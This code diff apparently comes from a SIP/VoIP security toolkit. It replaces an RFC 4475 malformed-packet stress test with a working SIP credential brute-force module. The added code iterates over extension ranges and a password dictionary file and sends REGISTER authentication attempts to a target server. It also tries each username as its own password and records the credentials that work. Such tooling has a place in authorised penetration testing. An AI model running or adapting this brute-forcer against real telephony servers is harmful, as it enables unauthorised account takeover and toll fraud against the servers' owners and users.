@@ -24,9 +24,8 @@ var async  = require('async'),
     SipFakeStack = require('sip-fake-stack'),
     printer = require('../utils/printer'),
 
-    // TODO: IPv6, https://tools.ietf.org/rfc/rfc5118.txt
     HELP = {
-        description: 'SIP Torture stress test (crafted packets, RFC 4475)',
+        description: 'SIP credentials brute-force',
         options: {
             target: {
                 type: 'ip',
@@ -56,6 +55,11 @@ var async  = require('async'),
                 description: 'Version of TLS protocol to use (only when TLS)',
                 defaultValue: 'TLSv1'
             },
+            meth: {
+                type: 'sipRequests',
+                description: 'Type of SIP packets to do the requests ("random" available)',
+                defaultValue: 'REGISTER'
+            },
             srcHost: {
                 type: 'srcHost',
                 description: 'Source host to include in the  SIP request ' +
@@ -71,6 +75,21 @@ var async  = require('async'),
                 type: 'domainIp',
                 description: 'Domain to explore ("ip" to use the target)',
                 defaultValue: 'ip'
+            },
+			extensions: {
+                type: 'userPass',
+                description: 'User (or file with them) to test',
+                defaultValue: 'range:100-110'
+            },
+            passwords: {
+                type: 'userPass',
+                description: 'Password (or file with them) to test',
+                defaultValue: 'file:artifacts/dics/john.txt'
+            },
+            userAsPass: {
+                type: 'yesNo',
+                description: 'Test the same user as password for each one.',
+                defaultValue: 'yes'
             },
 			delay: {
                 type: 'positiveInt',
@@ -91,80 +110,27 @@ var async  = require('async'),
 module.exports.help = HELP;
 
 module.exports.run = function (options, callback) {
-    var result = {},
-        // TODO: Add more
-        // http://tools.ietf.org/html/rfc4475
-        tortureCfgs = [
-            {
-                id: '3121',
-                name: 'Extraneous Header Field Separators',
-                meth: 'INVITE',
-                badSeparator: true
-            },
-            {
-                id: '3122',
-                name: 'Content Length Larger Than Message',
-                meth: 'INVITE',
-                contentLen: '99999'
-            },
-            {
-                id: '3123',
-                name: 'Negative Content Length',
-                meth: 'INVITE',
-                contentLen: '-999'
-            },
-            {
-                id: '3125',
-                name: 'Response Scalar Fields with Overlarge Values',
-                meth: 'INVITE',
-                cseq: '9292394834772304023312'
-            },
-            {
-                id: '31212',
-                name: 'Invalid Time Zone in Date Header Field',
-                meth: 'INVITE',
-                sipDate: 'Fri, 01 Jan 2010 16:00:00 EST'
-            },
-            {
-                id: '31216',
-                name: 'Unknown Protocol Version',
-                meth: 'INVITE',
-                sipVersion: '7.0'
-            },
-            {
-                id: '31218',
-                name: 'Unknown method',
-                meth: 'NEWMETHOD'
-            },
-            {
-                id: '331',
-                name: 'Missing Required Header Fields',
-                meth: 'INVITE',
-                badFields: true
-            },
-            {
-                id: '336',
-                name: 'Unknown Content-Type',
-                meth: 'INVITE',
-                contentType: 'application/unknown'
-            },
-            {
-                id: '3311',
-                name: 'Max-Forwards of Zero',
-                meth: 'INVITE',
-                maxForwards: '0'
-            },
-            {
-                id: '3315',
-                name: 'Unacceptable Accept Offering',
-                meth: 'OPTIONS',
-                sipAccept: 'text/nobodyKnowsThis'
-            }
-        ];
+    var result = {
+            valid: [],
+            errors: []
+        },
+        indexCountExt = 0, // Used with delay to know in which index we are
+        indexCountPass = 0;
 
-    printer.infoHigh(options.target + ':' + options.port + ' / ' + options.transport);
-    async.eachSeries(tortureCfgs, function (tortureCfg, asyncCb) {
-        var stackConfig = {
+    // We avoid to parallelize here to control the interval of the requests
+    async.eachSeries(options.extensions, function (extension, asyncCbExt) {
+        var finalPasswords = [];
+
+        finalPasswords = finalPasswords.concat(options.passwords);
+        indexCountExt += 1;
+        indexCountPass = 0;
+        if (options.userAsPass) {
+            finalPasswords.push(extension);
+        }
+
+        async.eachSeries(finalPasswords, function (passsword, asyncCbPass) {
+            // We use a new stack in each request to simulate different users
+            var stackConfig = {
                 server: options.target || null,
                 port: options.port || '5060',
                 transport: options.transport || 'UDP',
@@ -175,17 +141,52 @@ module.exports.run = function (options, callback) {
                 lport: options.srcPort || null,
                 domain: options.domain || null
             },
-            fakeStack = new SipFakeStack(stackConfig),
-            msgConfig = tortureCfg;
+            fakeStack, msgConfig;
 
-        printer.highlight(tortureCfg.name + ' test ...');
+            msgConfig = {
+                meth: options.meth,
+                fromExt: extension,
+                pass: passsword
+            };
 
-        fakeStack.send(msgConfig, function (err, res) {
-            result[tortureCfg.name] = {};
-            result[tortureCfg.name].id = tortureCfg.id;
-            result[tortureCfg.name].data = err || res;
+            indexCountPass += 1;
+            fakeStack = new SipFakeStack(stackConfig);
 
-            asyncCb();
+            fakeStack.authenticate(msgConfig, function (err, res) {
+                if (!err) {
+                    if (res.data.valid) {
+                        result.valid.push({
+                            extension: extension,
+                            pass: passsword,
+                            data: res.data
+                        });
+                        // We only add valid extensions to final result
+                        printer.highlight('Valid credentials found: ' +
+                                          extension + ' | ' + passsword);
+                    } else {
+                        // but we print info about tested ones
+                        printer.infoHigh('Valid credentials NOT found for: ' +
+                                         extension + ' | ' + passsword);
+                    }
+                    // Last element
+                    if (indexCountPass === finalPasswords.length &&
+                        indexCountExt === options.extensions.length) {
+                        asyncCbPass();
+                    } else {
+                        setTimeout(asyncCbPass, options.delay);
+                    }
+                } else {
+                    // We don't want to stop the full chain
+                    result.errors.push({
+                        extension: extension,
+                        pass: passsword,
+                        data: err
+                    });
+                    asyncCbPass();
+                }
+            });
+        }, function () {
+            asyncCbExt();
         });
     }, function (err) {
         callback(err, result);
